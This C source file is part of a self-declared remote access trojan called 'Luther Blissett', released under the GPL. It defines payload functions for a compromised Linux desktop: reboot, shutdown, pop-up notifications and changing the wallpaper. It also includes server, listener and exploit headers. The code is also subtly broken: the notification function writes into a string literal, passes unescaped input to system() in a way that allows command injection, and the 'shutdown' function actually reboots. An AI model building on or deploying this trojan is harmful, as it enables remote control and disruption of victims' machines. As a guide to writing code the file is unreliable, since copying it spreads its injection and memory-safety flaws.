/*
 *  Luther Blissett  --  Remote Access Trojan
 *  Copyright (C) 2024  Davide Usberti aka UsboKirishima
 *
 *  Luther Blissett is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Luther Blissett is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Luther Blissett.  If not, see <http://www.gnu.org/licenses/>.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <stdalign.h>
#include <regex.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <sys/statvfs.h>
#include <sys/mount.h>
#include <linux/loop.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/Xatom.h>
#include <Imlib2.h>

#include <logs/slog.h>
#include <errors/errors.h>
#include <server/server.h>
#include <server/listener.h>
#include <exploits/help.h>

char logs[1024];

void lb_reboot()
{
    system("reboot");
}

void lb_shutdown()
{
    system("shutdown -r now");
}

void lb_notify(char *notifyTitle, char *notifyDescription)
{
    char *notifyCommand = "";

    printf("2");
    sprintf(notifyCommand, "notify-send \"%s\" \"%s\" ", notifyTitle, notifyDescription);

    printf("3");
    system(notifyCommand);
}

void setWallpaper(const char *filePath)
{
    Display *dpy;
    Window root;
    Imlib_Image image;

    dpy = XOpenDisplay(NULL);
    if (!dpy)
    {
        fprintf(stderr, "Cannot open display\n");
        return;
    }

    root = DefaultRootWindow(dpy);
    image = imlib_load_image(filePath);
    if (!image)
    {
        fprintf(stderr, "Cannot load image: %s\n", filePath);
        XCloseDisplay(dpy);
        return;
    }

    imlib_context_set_image(image);
    int width = imlib_image_get_width();
    int height = imlib_image_get_height();
    int screen_width = DisplayWidth(dpy, DefaultScreen(dpy));
    int screen_height = DisplayHeight(dpy, DefaultScreen(dpy));

    Imlib_Image scaled_image = imlib_create_cropped_scaled_image(0, 0, width, height, screen_width, screen_height);
    imlib_context_set_image(scaled_image);
    imlib_render_image_on_drawable(0, 0);

    imlib_free_image();
    XCloseDisplay(dpy);
}